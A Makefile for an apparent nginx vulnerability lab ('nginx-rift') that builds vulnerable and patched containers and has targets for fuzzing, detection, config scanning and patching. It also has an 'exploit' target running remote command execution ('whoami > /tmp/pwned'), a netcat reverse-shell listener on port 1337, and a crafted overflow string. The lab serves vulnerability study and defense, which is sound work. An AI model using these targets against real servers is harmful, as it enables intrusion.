.PHONY: build run stop exploit detect vuln-config safe-config \
        fuzz test clean patch fix-container vuln-container \
        asan-container shell-collector

PORT ?= 19321
HOST ?= 127.0.0.1

build:
	docker compose -f env/docker-compose.yml build

run:
	docker compose -f env/docker-compose.yml up

stop:
	docker compose -f env/docker-compose.yml down

vuln-container:
	docker build -t nginx-rift-vuln -f Dockerfile.patched --build-arg NGINX_TYPE=vulnerable .

fix-container:
	docker build -t nginx-rift-fixed -f Dockerfile.patched --build-arg NGINX_TYPE=patched .

asan-container:
	docker build -t nginx-rift-asan -f ci/Dockerfile.asan .

trigger:
	python3 scripts/trigger.py --host $(HOST) --port $(PORT)

exploit:
	python3 scripts/exploit.py --host $(HOST) --port $(PORT) --cmd 'whoami > /tmp/pwned'

detect:
	bash scripts/detect_vuln.sh

vuln-config:
	python3 scripts/config_scanner.py configs/vulnerable.conf

safe-config:
	python3 scripts/config_scanner.py configs/safe.conf

scan-images:
	python3 scripts/container_scan.py

fuzz:
	cd fuzz && bash fuzz_build.sh && ./build/ngx_script_fuzz corpus/

fuzz-repro:
	cd fuzz && ./build/ngx_script_fuzz crashes/

monitor:
	python3 scripts/monitor_worker.py --host $(HOST) --port $(PORT)

test:
	bash test/run_tests.sh

compare:
	python3 scripts/compare_lengths.py --string "$$(python3 -c "print('A'*349 + '+'*969)")"

patch:
	patch -p1 < patches/0001-fix-is_args.patch

shell-collector:
	@echo "Starting reverse shell listener on port 1337..."
	@nc -l -p 1337

clean:
	rm -rf env/logs env/tmp fuzz/build
	docker compose -f env/docker-compose.yml down -v 2>/dev/null || true
